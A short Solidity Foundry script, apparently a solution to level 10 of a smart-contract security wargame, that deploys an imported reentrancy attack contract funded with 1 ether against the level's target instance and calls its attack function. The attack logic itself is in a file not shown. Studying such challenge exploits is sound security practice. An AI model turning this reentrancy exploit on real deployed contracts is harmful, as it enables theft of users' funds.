// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";
import {Reentrancy} from "../src/Level10.sol";

// ================================================================
// │                       LEVEL 10 - REENTRANCY                  │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();
        Reentrancy reentrancy = new Reentrancy{value: 1 ether}(targetContractAddress);
        reentrancy.attack();
        vm.stopBroadcast();
    }
}
